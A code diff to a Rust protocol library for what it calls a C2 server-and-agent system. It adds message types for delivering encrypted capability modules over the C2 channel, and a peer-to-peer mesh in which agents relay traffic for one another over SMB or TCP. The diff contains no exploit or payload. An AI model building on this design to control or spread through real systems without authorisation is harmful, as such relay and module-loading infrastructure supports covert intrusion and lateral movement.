@@ -27,11 +27,19 @@ pub const NONCE_LEN: usize = 12;
 /// `salt(32) || nonce(12) || ciphertext_with_tag`.
 pub const PROTOCOL_VERSION: u32 = 2;
 
+/// Audit event logging for operator actions and agent state changes.
 pub mod audit;
+/// Agent and server configuration structures (TOML deserialization).
 pub mod config;
+/// X25519 forward-secrecy key exchange for session establishment.
 pub mod forward_secrecy;
+/// Indicator-of-compromise detection and reporting.
 pub mod ioc;
+/// Transport-layer normalization (Base64, Mask XOR, Netbios encoding).
 pub mod normalized_transport;
+/// P2P mesh protocol message types and link management.
+pub mod p2p_proto;
+/// TLS transport configuration and certificate handling.
 pub mod tls_transport;
 
 pub use audit::{AuditEvent, Outcome};
@@ -90,6 +98,59 @@ pub enum Message {
     },
     AuditLog(AuditEvent),
     Shutdown,
+    /// Agent requests a capability module by ID.  The server locates the
+    /// module file on disk, signs and encrypts it, and replies with a
+    /// [`ModuleResponse`].  This replaces the legacy direct-HTTP download
+    /// path (`reqwest::get`) so that module transfer is tunnelled through
+    /// the encrypted C2 channel.
+    ModuleRequest {
+        module_id: String,
+    },
+    /// Server delivers a signed, AES-GCM-encrypted module to the agent in
+    /// response to a [`ModuleRequest`].  The `encrypted_blob` has the same
+    /// wire format as [`ModulePush::encrypted_blob`] and can be fed directly
+    /// to `module_loader::load_plugin`.
+    ModuleResponse {
+        module_id: String,
+        encrypted_blob: Vec<u8>,
+    },
+    /// P2P mesh: a parent agent forwards C2 traffic on behalf of a child.
+    ///
+    /// `child_link_id` identifies the originating child in the parent's link
+    /// table so the server can route the response back to the correct child.
+    /// `data` is the **plaintext** C2 payload (e.g. a serialized
+    /// `TaskResponse`) that the child intended for the server.  The C2
+    /// transport layer encrypts the entire `Message` (including this variant)
+    /// with the parent's AES-256-GCM session key before transmission, so
+    /// `data` is encrypted in transit without requiring a separate encryption
+    /// step.
+    P2pForward {
+        child_link_id: u32,
+        data: Vec<u8>,
+    },
+    /// P2P mesh: the server sends C2 traffic addressed to a specific child
+    /// through its parent.  The parent looks up `child_link_id` in its link
+    /// table, re-encrypts `data` with the child's per-link ChaCha20-Poly1305
+    /// key, and forwards it as a `DataForward` P2P frame.
+    P2pToChild {
+        child_link_id: u32,
+        data: Vec<u8>,
+    },
+    /// P2P mesh topology report.  Sent periodically by each agent to its
+    /// parent (or directly to the server if the agent has no parent).
+    /// Contains the agent's current set of child links so the server can
+    /// maintain a full mesh topology map.
+    P2pTopologyReport {
+        agent_id: String,
+        children: Vec<P2pChildInfo>,
+    },
+}
+
+/// A single child entry in a [`Message::P2pTopologyReport`].
+#[derive(Serialize, Deserialize, Debug, Clone)]
+pub struct P2pChildInfo {
+    pub link_id: u32,
+    pub agent_id: String,
 }
 
 /// The set of administrator-approved actions the agent is willing to perform.
@@ -255,6 +316,36 @@ pub enum Command {
         username: Option<String>,
         password: Option<String>,
     },
+    // ── P2P mesh management ────────────────────────────────────────────────
+    /// Instruct a child agent to establish a P2P link to a parent agent.
+    LinkAgents {
+        parent_agent_id: String,
+        child_agent_id: String,
+        /// Transport to use: `"smb"` or `"tcp"`.
+        transport: String,
+        /// Target address for TCP links (host:port).  Ignored for SMB.
+        #[serde(default)]
+        target_addr: String,
+    },
+    /// Instruct an agent to disconnect from its P2P parent.
+    UnlinkAgent {
+        agent_id: String,
+    },
+    /// Return the full P2P mesh topology visible to this agent.
+    ListTopology,
+    // ── Agent-side P2P link management ─────────────────────────────────────
+    /// Connect to a parent agent at the given address using the specified
+    /// transport (`"tcp"` or `"smb"`).
+    LinkTo {
+        parent_addr: String,
+        transport: String,
+    },
+    /// Disconnect from a P2P link.  `None` means disconnect from all links.
+    Unlink {
+        link_id: Option<u32>,
+    },
+    /// Report the current P2P links on this agent.
+    ListLinks,
 }
 
 /// Errors produced by [`CryptoSession`].
